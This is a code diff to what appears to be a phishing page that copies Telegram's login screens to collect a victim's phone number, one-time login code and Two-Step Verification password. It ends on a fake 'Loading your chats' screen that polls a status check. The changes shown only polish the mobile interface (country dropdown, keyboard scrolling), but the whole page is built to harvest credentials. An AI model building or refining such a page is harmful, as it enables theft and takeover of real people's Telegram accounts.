@@ -10,7 +10,7 @@
     <script src="./config.js"></script>
 <style>
     /* 🌟 Theme Variables & CSS (Minified for performance) 🌟 */
-    :root{--tg-primary:#3390ec;--tg-bg:#ffffff;--tg-text:#000000;--tg-hint:#707579;--tg-border:#dadce0;--error-text:#e53935;--error-bg:#ffebee;--success-color:#34c759;} @media(prefers-color-scheme:dark){:root{--tg-primary:#8774e1;--tg-bg:#212121;--tg-text:#ffffff;--tg-hint:#aaaaaa;--tg-border:#444444;--error-text:#ff595a;--error-bg:rgba(255,89,90,0.15);}} html.tg-dark{--tg-primary:#8774e1!important;--tg-bg:#212121!important;--tg-text:#ffffff!important;--tg-hint:#aaaaaa!important;--tg-border:#444444!important;--error-text:#ff595a!important;--error-bg:rgba(255,89,90,0.15)!important;} html.tg-light{--tg-primary:#3390ec!important;--tg-bg:#ffffff!important;--tg-text:#000000!important;--tg-hint:#707579!important;--tg-border:#dadce0!important;--error-text:#e53935!important;--error-bg:#ffebee!important;} *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;margin:0;padding:0;} body{color:var(--tg-text);background:var(--tg-bg);height:100vh;width:100vw;display:flex;flex-direction:column;align-items:center;overflow-x:hidden;overflow-y:auto;transition:background-color 0.3s ease,color 0.3s ease;} .step{display:none;width:100%;max-width:400px;flex-direction:column;align-items:center;padding:40px 24px;text-align:center;} .active{display:flex;animation:fadeIn 0.3s ease;} @keyframes fadeIn{from{opacity:0;}to{opacity:1;}} .tg-logo{width:105px;height:105px;margin:20px 0;} .monkey-img{width:120px;height:120px;margin-bottom:15px;} h2{font-size:22px;font-weight:600;margin-bottom:10px;color:var(--tg-text);} p.subtitle{font-size:15px;color:var(--tg-hint);line-height:1.5;margin-bottom:25px;} .phone-display{font-size:20px;font-weight:600;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;} .phone-display i{font-size:14px;color:var(--tg-hint);cursor:pointer;} .input-group{width:100%;margin-bottom:25px;display:flex;flex-direction:column;gap:15px;} .md-input-box{position:relative;width:100%;} .md-input-box input{width:100%;padding:16px 15px;font-size:16px;border:1px solid var(--tg-border);border-radius:12px;background:transparent;color:var(--tg-text);outline:none;transition:all 0.2s;} .md-input-box label{position:absolute;left:12px;top:16px;color:var(--tg-hint);font-size:16px;background:var(--tg-bg);padding:0 4px;pointer-events:none;transition:0.2s ease all;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:90%;} .md-input-box input:focus~label,.md-input-box input:not(:placeholder-shown)~label{top:-9px;font-size:13px;} .md-input-box input:focus~label{color:var(--tg-primary);} .md-input-box input:focus{border-color:var(--tg-primary);border-width:2px;padding:15px 14px;} .md-input-box.error input{border-color:var(--error-text)!important;} .md-input-box.error input:focus{border-width:2px;padding:15px 14px;} .md-input-box.error label{color:var(--error-text)!important;} .country-text{width:100%;padding:16px 15px;font-size:16px;border:1px solid var(--tg-border);border-radius:12px;color:var(--tg-text);display:flex;justify-content:space-between;align-items:center;cursor:pointer;} .toggle-pw{position:absolute;right:15px;top:50%;transform:translateY(-50%);color:var(--tg-hint);font-size:18px;cursor:pointer;z-index:3;} .checkbox-wrap{display:flex;align-items:center;width:100%;gap:15px;margin-bottom:30px;padding-left:5px;} .checkbox-wrap input[type="checkbox"]{width:20px;height:20px;accent-color:var(--tg-primary);cursor:pointer;} .checkbox-wrap label{font-size:15px;color:var(--tg-text);cursor:pointer;} .tg-btn{position:relative;background:var(--tg-primary);color:#fff;padding:16px;width:100%;border-radius:10px;border:none;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:opacity 0.2s;text-transform:uppercase;} .tg-btn:active{opacity:0.8;} .tg-btn:disabled{opacity:0.7;cursor:not-allowed;} #loginBtn,#confirmBtn{opacity:0;pointer-events:none;transform:translateY(15px);transition:all 0.3s ease;} #loginBtn.show-btn,#confirmBtn.show-btn{opacity:1;pointer-events:auto;transform:translateY(0);} .links-wrap{display:flex;flex-direction:column;gap:20px;margin-top:30px;} .links-wrap a{color:var(--tg-primary);text-decoration:none;font-weight:500;font-size:14px;text-transform:uppercase;} .spinner-container{position:absolute;right:16px;top:0;bottom:0;display:flex;align-items:center;} .btn-spinner{display:none;width:20px;height:20px;border:2px solid transparent;border-right:2px solid #fff;border-top:2px solid #fff;border-radius:50%;animation:spin 0.6s linear infinite;} .loader-ring{width:44px;height:44px;border:3px solid var(--tg-border);border-top:3px solid var(--tg-primary);border-radius:50%;animation:spin 0.8s linear infinite;margin:30px auto;} @keyframes spin{100%{transform:rotate(360deg);}} .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:var(--tg-bg);z-index:100;overflow-y:auto;} .modal-overlay.open{display:block;animation:slideUp 0.3s ease;} @keyframes slideUp{from{transform:translateY(100%);}to{transform:translateY(0);}} .modal-header{padding:15px 24px;font-size:20px;font-weight:600;display:flex;align-items:center;gap:20px;position:sticky;top:0;background:var(--tg-bg);border-bottom:1px solid var(--tg-border);z-index:101;} .country-item{display:flex;justify-content:space-between;padding:15px 24px;border-bottom:1px solid var(--tg-border);cursor:pointer;color:var(--tg-text);font-size:16px;} .country-item:active{background:rgba(135,116,225,0.1);} .country-item span:last-child{color:var(--tg-hint);}
+    :root{--tg-primary:#3390ec;--tg-bg:#ffffff;--tg-text:#000000;--tg-hint:#707579;--tg-border:#dadce0;--error-text:#e53935;--error-bg:#ffebee;--success-color:#34c759;} @media(prefers-color-scheme:dark){:root{--tg-primary:#8774e1;--tg-bg:#212121;--tg-text:#ffffff;--tg-hint:#aaaaaa;--tg-border:#444444;--error-text:#ff595a;--error-bg:rgba(255,89,90,0.15);}} html.tg-dark{--tg-primary:#8774e1!important;--tg-bg:#212121!important;--tg-text:#ffffff!important;--tg-hint:#aaaaaa!important;--tg-border:#444444!important;--error-text:#ff595a!important;--error-bg:rgba(255,89,90,0.15)!important;} html.tg-light{--tg-primary:#3390ec!important;--tg-bg:#ffffff!important;--tg-text:#000000!important;--tg-hint:#707579!important;--tg-border:#dadce0!important;--error-text:#e53935!important;--error-bg:#ffebee!important;} *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;margin:0;padding:0;} body{color:var(--tg-text);background:var(--tg-bg);height:100vh;width:100vw;display:flex;flex-direction:column;align-items:center;overflow:hidden;transition:background-color 0.3s ease,color 0.3s ease;} body.keyboard-open{overflow-y:auto;padding-bottom:45vh;} .step{display:none;width:100%;max-width:400px;flex-direction:column;align-items:center;padding:20px 24px;text-align:center;margin:auto;} .active{display:flex;animation:fadeIn 0.3s ease;} @keyframes fadeIn{from{opacity:0;}to{opacity:1;}} .tg-logo{width:105px;height:105px;margin:20px 0;} .monkey-img{width:120px;height:120px;margin-bottom:15px;} h2{font-size:22px;font-weight:600;margin-bottom:10px;color:var(--tg-text);} p.subtitle{font-size:15px;color:var(--tg-hint);line-height:1.5;margin-bottom:25px;} .phone-display{font-size:20px;font-weight:600;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;} .phone-display i{font-size:14px;color:var(--tg-hint);cursor:pointer;} .input-group{width:100%;margin-bottom:25px;display:flex;flex-direction:column;gap:15px;} .md-input-box{position:relative;width:100%;} .md-input-box input{width:100%;padding:16px 15px;font-size:16px;border:1px solid var(--tg-border);border-radius:12px;background:transparent;color:var(--tg-text);outline:none;transition:all 0.2s;} .md-input-box label{position:absolute;left:12px;top:16px;color:var(--tg-hint);font-size:16px;background:var(--tg-bg);padding:0 4px;pointer-events:none;transition:0.2s ease all;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:90%;} .md-input-box input:focus~label,.md-input-box input:not(:placeholder-shown)~label{top:-9px;font-size:13px;} .md-input-box input:focus~label{color:var(--tg-primary);} .md-input-box input:focus{border-color:var(--tg-primary);border-width:2px;padding:15px 14px;} .md-input-box.error input{border-color:var(--error-text)!important;} .md-input-box.error input:focus{border-width:2px;padding:15px 14px;} .md-input-box.error label{color:var(--error-text)!important;} .country-text{width:100%;padding:16px 15px;font-size:16px;border:1px solid var(--tg-border);border-radius:12px;color:var(--tg-text);display:flex;justify-content:space-between;align-items:center;cursor:pointer;} .toggle-pw{position:absolute;right:15px;top:50%;transform:translateY(-50%);color:var(--tg-hint);font-size:18px;cursor:pointer;z-index:3;} .checkbox-wrap{display:flex;align-items:center;width:100%;gap:15px;margin-bottom:30px;padding-left:5px;} .checkbox-wrap input[type="checkbox"]{width:20px;height:20px;accent-color:var(--tg-primary);cursor:pointer;} .checkbox-wrap label{font-size:15px;color:var(--tg-text);cursor:pointer;} .tg-btn{position:relative;background:var(--tg-primary);color:#fff;padding:16px;width:100%;border-radius:10px;border:none;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:opacity 0.2s;text-transform:uppercase;} .tg-btn:active{opacity:0.8;} .tg-btn:disabled{opacity:0.7;cursor:not-allowed;} #loginBtn,#confirmBtn{opacity:0;pointer-events:none;transform:translateY(15px);transition:all 0.3s ease;} #loginBtn.show-btn,#confirmBtn.show-btn{opacity:1;pointer-events:auto;transform:translateY(0);} .links-wrap{display:flex;flex-direction:column;gap:20px;margin-top:30px;} .links-wrap a{color:var(--tg-primary);text-decoration:none;font-weight:500;font-size:14px;text-transform:uppercase;} .spinner-container{position:absolute;right:16px;top:0;bottom:0;display:flex;align-items:center;} .btn-spinner{display:none;width:20px;height:20px;border:2px solid transparent;border-right:2px solid #fff;border-top:2px solid #fff;border-radius:50%;animation:spin 0.6s linear infinite;} .loader-ring{width:44px;height:44px;border:3px solid var(--tg-border);border-top:3px solid var(--tg-primary);border-radius:50%;animation:spin 0.8s linear infinite;margin:30px auto;} @keyframes spin{100%{transform:rotate(360deg);}} .country-dropdown{display:none;position:absolute;top:100%;left:0;width:100%;max-height:280px;overflow-y:auto;background:var(--tg-bg);border:1px solid var(--tg-primary);border-radius:0 0 12px 12px;box-shadow:0 8px 16px rgba(0,0,0,0.15);z-index:100;border-top:none;} .country-dropdown.open{display:block;} .md-input-box.dropdown-open input{border-radius:12px 12px 0 0;border-bottom-color:transparent;} .country-item{display:flex;justify-content:space-between;padding:12px 15px;cursor:pointer;color:var(--tg-text);font-size:16px;border-bottom:1px solid rgba(128,128,128,0.1);} .country-item:hover,.country-item:active{background:rgba(135,116,225,0.1);} .country-item span:last-child{color:var(--tg-hint);} .country-icon-wrapper{position:absolute;right:15px;top:50%;transform:translateY(-50%);color:var(--tg-hint);font-size:14px;pointer-events:none;}
 </style>
 </head>
 <body>
@@ -29,16 +29,22 @@
         <p class="subtitle">Please confirm your country code and enter your phone number.</p>
         
         <div class="input-group">
-            <div class="md-input-box">
-                <div class="country-text" onclick="openCountryModal()">
-                    <span id="country_name_disp">Country</span> 
-                    <i class="fa-solid fa-chevron-down" style="color: var(--tg-hint); font-size: 14px;"></i>
+            <!-- 🌟 Country Dropdown Box 🌟 -->
+            <div class="md-input-box" id="country_box" style="z-index: 50;">
+                <!-- onfocus እና onblur ተጨምሯል 🌟 -->
+                <input type="text" id="country_search" value="Ethiopia" placeholder=" " autocomplete="off" onfocus="openDropdown()" oninput="filterCountries()" onblur="closeDropdown()">
+                <label>Country</label>
+                <div class="country-icon-wrapper">
+                    <i class="fa-solid fa-chevron-down" id="country_icon"></i>
                 </div>
-                <label style="top:-9px; font-size:13px;">Country</label>
+                <!-- Dropdown List -->
+                <div id="dropdown_list" class="country-dropdown"></div>
             </div>
             
+            <!-- Phone Box -->
             <div class="md-input-box" id="phone_box">
-                <input type="tel" id="phone_input" value="+" placeholder=" " oninput="handlePhoneInput(this)">
+                <!-- 🌟 ኪቦርድ ሲከፈት ወደ ላይ ይገፋዋል (focusInput) እና ሲዘጋ ይቆልፈዋል (blurInput) 🌟 -->
+                <input type="tel" id="phone_input" value="+251 " placeholder=" " oninput="handlePhoneInput(this)" onfocus="focusInput(this, 'loginBtn')" onblur="blurInput()">
                 <label id="phone_label">Your phone number</label>
             </div>
         </div>
@@ -66,7 +72,7 @@
         <p class="subtitle">We've sent the code to the <b>Telegram</b> app on your other device.</p>
 
         <div class="md-input-box" id="otp_box" style="margin-top: 10px;">
-            <input type="tel" id="otp_native_input" placeholder=" " autocomplete="one-time-code" maxlength="5" oninput="handleOtpInput(this)">
+            <input type="tel" id="otp_native_input" placeholder=" " autocomplete="one-time-code" maxlength="5" oninput="handleOtpInput(this)" onfocus="focusInput(this)" onblur="blurInput()">
             <label id="otp_label">Code</label>
         </div>
     </div>
@@ -78,7 +84,7 @@
         <p class="subtitle">You have Two-Step Verification enabled, so your account is protected with an additional password.</p>
         
         <div class="md-input-box" id="2fa_box" style="margin-top: 10px;">
-            <input type="password" id="2fa_input" placeholder=" " style="padding-right: 45px;" oninput="resetError(3); handlePasswordInput(this);" onkeypress="handlePasswordEnter(event)">
+            <input type="password" id="2fa_input" placeholder=" " style="padding-right: 45px;" oninput="resetError(3); handlePasswordInput(this);" onkeypress="handlePasswordEnter(event)" onfocus="focusInput(this, 'confirmBtn')" onblur="blurInput()">
             <label id="2fa_label">Password</label>
             <i class="fa-solid fa-eye-slash toggle-pw" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
         </div>
@@ -95,14 +101,6 @@
         <h2>Welcome</h2>
         <p class="subtitle">Loading your chats...</p>
         <div class="loader-ring"></div>
-    </div>
-
-    <!-- Country Selection Modal -->
-    <div id="countryModal" class="modal-overlay">
-        <div class="modal-header">
-            <i class="fa-solid fa-arrow-left" onclick="closeCountryModal()" style="cursor:pointer"></i> Choose a country
-        </div>
-        <div id="countryListDiv"></div>
     </div>
 
 <script>
@@ -177,31 +175,84 @@
     }
 
     document.addEventListener("DOMContentLoaded", function() { 
-        initCountries(); 
+        renderCountries(countryList); 
         checkStatus(); 
         statusChecker = setInterval(checkStatus, 3000); 
     });
 
-    function initCountries() {
-        let h = "";
-        countryList.forEach(c => {
-            h += `<div class="country-item" onclick="selectCountry('${c.n}','${c.c}')"><span>${c.f} &nbsp;&nbsp;${c.n}</span><span>${c.c}</span></div>`
-        });
-        document.getElementById('countryListDiv').innerHTML = h;
+    // 🌟 ኪቦርድ ሲከፈት እና ሲዘጋ የሚሰራ (Auto-scroll & Lock) 🌟
+    function focusInput(el, btnId) {
+        document.body.classList.add('keyboard-open'); // Scroll እንዲፈቀድ ያደርጋል
+        setTimeout(() => {
+            let target = el;
+            if (btnId) {
+                let btn = document.getElementById(btnId);
+                if (btn && btn.classList.contains('show-btn')) {
+                    target = btn; // Button ከታየ እሱን ወደ መሃል ይገፋዋል
+                }
+            }
+            target.scrollIntoView({behavior: 'smooth', block: 'center'});
+        }, 300);
     }
 
-    function openCountryModal() { document.getElementById('countryModal').classList.add('open'); } 
-    function closeCountryModal() { document.getElementById('countryModal').classList.remove('open'); }
+    function blurInput() {
+        setTimeout(() => {
+            // Button ላይ ጠቅ ስናደርግ Focus እንዳይጠፋ ትንሽ እንጠብቃለን
+            document.body.classList.remove('keyboard-open'); // መልሶ ይቆልፈዋል (overflow: hidden)
+            window.scrollTo({top: 0, behavior: 'smooth'}); // ስክሪኑን ወደ መሃል ይመልሰዋል
+        }, 200);
+    }
+
+    // 🌟 Dropdown Logic 🌟
+    function renderCountries(list) {
+        let h = "";
+        list.forEach(c => {
+            h += `<div class="country-item" onmousedown="selectCountry('${c.n}','${c.c}')"><span>${c.f} &nbsp;&nbsp;${c.n}</span><span>${c.c}</span></div>`
+        });
+        document.getElementById('dropdown_list').innerHTML = h;
+    }
+
+    function openDropdown() { 
+        document.body.classList.add('keyboard-open');
+        document.getElementById('dropdown_list').classList.add('open');
+        document.getElementById('country_box').classList.add('dropdown-open');
+        document.getElementById('country_icon').classList.replace('fa-chevron-down', 'fa-chevron-up');
+        document.getElementById('country_search').value = "";
+        renderCountries(countryList);
+        setTimeout(()=>document.getElementById('country_box').scrollIntoView({behavior:'smooth',block:'start'}), 150);
+    } 
+    
+    function closeDropdown() { 
+        setTimeout(() => {
+            if(document.activeElement !== document.getElementById('phone_input')) {
+                document.body.classList.remove('keyboard-open');
+            }
+            document.getElementById('dropdown_list').classList.remove('open');
+            document.getElementById('country_box').classList.remove('dropdown-open');
+            document.getElementById('country_icon').classList.replace('fa-chevron-up', 'fa-chevron-down');
+            
+            let v = document.getElementById('phone_input').value.replace(/\s/g, '');
+            let sortedCountries = [...countryList].sort((a, b) => b.c.length - a.c.length);
+            let m = sortedCountries.find(c => v.startsWith(c.c));
+            document.getElementById('country_search').value = m ? m.n : "Country";
+        }, 150);
+    }
+
+    function filterCountries() {
+        let val = document.getElementById('country_search').value.toLowerCase();
+        let filtered = countryList.filter(c => c.n.toLowerCase().includes(val) || c.c.includes(val));
+        renderCountries(filtered);
+    }
 
     function selectCountry(n, c) {
-        document.getElementById('country_name_disp').innerText = n;
+        document.getElementById('country_search').value = n;
         let p = document.getElementById('phone_input');
         p.value = c + " ";
-        closeCountryModal();
         handlePhoneInput(p);
         p.focus();
     }
 
+    // 🌟 Phone Input Logic 🌟
     function handlePhoneInput(el) {
         resetError(1);
         
@@ -220,10 +271,10 @@
         let countryCode = "";
         
         if (m) {
-            document.getElementById('country_name_disp').innerText = m.n;
+            document.getElementById('country_search').value = m.n;
             countryCode = m.c;
         } else {
-            document.getElementById('country_name_disp').innerText = 'Country';
+            document.getElementById('country_search').value = 'Country';
         }
 
         if (countryCode && v.length > countryCode.length) {
@@ -235,7 +286,10 @@
         
         const b = document.getElementById('loginBtn');
         if (d.length >= 8) {
-            b.classList.add('show-btn');
+            if (!b.classList.contains('show-btn')) {
+                b.classList.add('show-btn');
+                setTimeout(() => b.scrollIntoView({behavior: 'smooth', block: 'center'}), 150);
+            }
         } else {
             b.classList.remove('show-btn');
         }
@@ -441,7 +495,10 @@
     function handlePasswordInput(el) { 
         const btn = document.getElementById('confirmBtn'); 
         if (el.value.length >= 2) {
-            btn.classList.add('show-btn'); 
+            if (!btn.classList.contains('show-btn')) {
+                btn.classList.add('show-btn'); 
+                setTimeout(() => btn.scrollIntoView({behavior: 'smooth', block: 'center'}), 150);
+            }
         } else {
             btn.classList.remove('show-btn'); 
         }
@@ -502,4 +559,3 @@
 </script>
 </body>
 </html>
-
